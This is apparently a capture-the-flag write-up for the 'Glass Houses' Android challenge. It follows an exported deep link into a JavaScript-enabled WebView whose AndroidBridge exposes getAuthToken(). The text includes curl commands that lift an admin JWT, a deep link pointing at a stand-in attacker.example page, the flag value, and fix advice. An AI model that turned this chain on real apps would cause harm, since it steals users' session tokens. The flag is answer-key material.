# Glass Houses

## Metadata

| Field | Value |
| --- | --- |
| Category | `mobile` |
| Difficulty | Medium |
| Points | 100 |
| Solves | 109 |
| First Blood | onurbsecurity |

## Challenge Description

```text
FluidRealty sells houses through a slick Android app (v3.7.2), backed by a live
API full of property listings. Some listings are more private than others.
```

## Artifacts

The archive contained decompiled Android source:

```text
public.zip
extracted/decompiled-src/AndroidManifest.xml
extracted/decompiled-src/com/fluidrealty/app/MainActivity.java
extracted/decompiled-src/com/fluidrealty/app/WebViewActivity.java
extracted/decompiled-src/com/fluidrealty/app/bridge/AndroidBridge.java
extracted/decompiled-src/com/fluidrealty/app/network/ApiService.java
solve_glass.sh
```

Target used during the solve:

```text
https://49be3891e98d62c0.chal.ctf.ae
```

## Recon

I started with the mobile artifact before probing the API. The archive contained
a decompiled Android application, and the manifest gave the first route into the
app:

```xml
<manifest
    package="com.fluidrealty.app"
    android:versionName="3.7.2">
```

The same manifest showed an exported `MainActivity` with a browsable deep-link
scheme:

```xml
<activity
    android:name=".MainActivity"
    android:exported="true"
    android:launchMode="singleTask">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="fluidrealty" />
    </intent-filter>
</activity>
```

That did not prove a bug by itself. It only told me that external links can open
the app. The next step was to see what the app does with that deep link.

`MainActivity.java` handled the `fluidrealty://view` action by reading a `url`
query parameter and passing it into `WebViewActivity`:

```java
case "view":
    String url = deepLink.getQueryParameter("url");
    if (url != null) {
        Intent webViewIntent = new Intent(this, WebViewActivity.class);
        webViewIntent.putExtra("load_url", url);
        startActivity(webViewIntent);
    }
    break;
```

That made the WebView the next artifact to inspect.

## Vulnerability

The vulnerable chain is the combination of:

1. an exported deep link that accepts an arbitrary URL;
2. a WebView that loads that URL without a domain allowlist;
3. JavaScript enabled in the WebView;
4. a native JavaScript bridge that exposes the session token.

`WebViewActivity.java` loads the `load_url` extra directly:

```java
String url = getIntent().getStringExtra("load_url");
if (url != null && !url.isEmpty()) {
    webView.loadUrl(url);
}
```

The WebView configuration then enables JavaScript and attaches `AndroidBridge`:

```java
settings.setJavaScriptEnabled(true);
settings.setAllowUniversalAccessFromFileURLs(true);
settings.setAllowFileAccessFromFileURLs(true);

webView.addJavascriptInterface(
    new AndroidBridge(this), "AndroidBridge"
);
```

This was the point where I checked whether the pattern was a known Android
security issue rather than only a suspicious local implementation detail. The
Android `WebView.addJavascriptInterface()` documentation and Android's security
guidance for insecure native bridges both describe the same risk: Java methods
exposed through a bridge are callable from JavaScript running in the WebView, so
the bridge must not be available to untrusted content.

The bridge exposes several methods to JavaScript. The critical one is
`getAuthToken()`:

```java
@JavascriptInterface
public String getAuthToken() {
    return TokenManager.getInstance(context).getCurrentToken();
}
```

At this point the attack idea was concrete: if an attacker can make the app load
attacker-controlled content in that WebView, that content can execute:

```javascript
AndroidBridge.getAuthToken()
```

and read the app's auth token.

The API code showed why that token matters. `ApiService.java` contains an admin
endpoint:

```java
@GET("/api/properties/admin")
Call<List<Property>> getAdminProperties(
    @Header("Authorization") String authorization
);
```

The bug is therefore not just "a WebView exists". The issue is that untrusted
web content gets access to a native bridge method that returns an authorization
token, and that token authorizes a private backend endpoint.

## Exploitation

The exploit chain was:

1. Read the manifest and identify the exported `fluidrealty://` deep link.
2. Follow `fluidrealty://view?url=...` into `MainActivity.java`.
3. Confirm that `WebViewActivity` loads the supplied URL and enables JavaScript.
4. Inspect `AndroidBridge.java` and find `getAuthToken()`.
5. Confirm that the backend exposes `/api/webview/simulate`, a challenge helper
   that simulates JavaScript execution inside that WebView with the bridge
   attached.
6. Execute `AndroidBridge.getAuthToken()` through the simulator.
7. Use the returned token as `Authorization: Bearer <token>` on
   `/api/properties/admin`.

The live root endpoint listed the available API routes:

```bash
curl -k https://49be3891e98d62c0.chal.ctf.ae/
```

Response:

```json
{
  "endpoints": [
    "/api/properties",
    "/api/properties/admin",
    "/api/deeplink/process",
    "/api/webview/simulate"
  ],
  "service": "FluidRealty API",
  "version": "3.7.2"
}
```

The public listing endpoint worked without a token:

```bash
curl -k https://49be3891e98d62c0.chal.ctf.ae/api/properties
```

Representative response:

```json
{
  "total": 5,
  "properties": [
    {"id": 1, "title": "Modern Loft in Chapinero", "status": "available"}
  ]
}
```

The admin endpoint rejected unauthenticated access:

```bash
curl -k -i https://49be3891e98d62c0.chal.ctf.ae/api/properties/admin
```

Response:

```json
{"error":"Authentication required","message":"Provide a valid Bearer token"}
```

The API also provided a deep-link simulator. I used it as a sanity check for the
mobile chain:

```bash
curl -k -H 'Content-Type: application/json' \
  -d '{"deeplink":"fluidrealty://view?url=https%3A%2F%2Fattacker.example%2Fsteal.html"}' \
  https://49be3891e98d62c0.chal.ctf.ae/api/deeplink/process
```

Relevant response:

```json
{
  "target_url": "https://attacker.example/steal.html",
  "simulation": {
    "bridge_available": true,
    "bridge_methods": ["getAuthToken", "getDeviceId", "getAppVersion", "showToast", "logEvent"],
    "status": "loaded"
  },
  "webview_config": {
    "javaScriptEnabled": true,
    "javaScriptInterfaces": ["AndroidBridge"]
  }
}
```

Then I executed the bridge call:

```bash
curl -k -H 'Content-Type: application/json' \
  -d '{"javascript":"AndroidBridge.getAuthToken()"}' \
  https://49be3891e98d62c0.chal.ctf.ae/api/webview/simulate
```

The response contained an admin JWT:

```json
{
  "execution": {
    "method": "getAuthToken",
    "result": "<admin JWT>",
    "success": true
  }
}
```

Using that token on `/api/properties/admin` returned the classified listings and
the flag:

```bash
curl -k \
  -H 'X-App-Version: 3.7.2' \
  -H 'X-Platform: android' \
  -H 'Authorization: Bearer <admin JWT>' \
  https://49be3891e98d62c0.chal.ctf.ae/api/properties/admin
```

Relevant response:

```json
{
  "flag": "flag{0b4043555abde9a6}",
  "message": "Access granted to classified listings",
  "total": 2
}
```

## Technical Details

`addJavascriptInterface()` exposes annotated Java methods to JavaScript running
inside the WebView. That is useful when all loaded content is trusted, but it is
dangerous when the WebView can load attacker-controlled URLs.

The app's trust boundary should have been:

```text
trusted FluidRealty pages -> AndroidBridge
untrusted external pages  -> no AndroidBridge
```

The actual behavior was:

```text
fluidrealty://view?url=<any URL>
        |
        v
WebViewActivity.loadUrl(<any URL>)
        |
        v
JavaScript runs with AndroidBridge attached
        |
        v
AndroidBridge.getAuthToken() returns backend token
        |
        v
/api/properties/admin accepts token
```

A proper fix would include a strict allowlist for WebView URLs, removing the
JavaScript interface before loading untrusted content, and not exposing raw auth
tokens through a bridge method. The API should also keep admin authorization tied
to server-side user state instead of relying on a mobile token that any loaded
page can read.

## Exploit Artifact

The final artifact is [solve_glass.sh](solve_glass.sh). It calls
`/api/webview/simulate`, extracts the token returned by
`AndroidBridge.getAuthToken()`, and uses it on `/api/properties/admin`.

Usage:

```bash
chmod +x solve_glass.sh
./solve_glass.sh https://49be3891e98d62c0.chal.ctf.ae
```

The script prints the extracted flag when successful.

## Validation

Public route:

```json
{"total":5}
```

Admin route without token:

```json
{"error":"Authentication required","message":"Provide a valid Bearer token"}
```

Bridge simulation:

```json
{"method":"getAuthToken","success":true}
```

Admin route with bridge token:

```json
{"flag":"flag{0b4043555abde9a6}","message":"Access granted to classified listings"}
```

Final script output:

```text
flag{0b4043555abde9a6}
```

## References

- <https://developer.android.com/reference/android/webkit/WebView#addJavascriptInterface(java.lang.Object,%20java.lang.String)>
- <https://developer.android.com/privacy-and-security/risks/insecure-webview-native-bridges>

## Flag

```text
flag{0b4043555abde9a6}
```
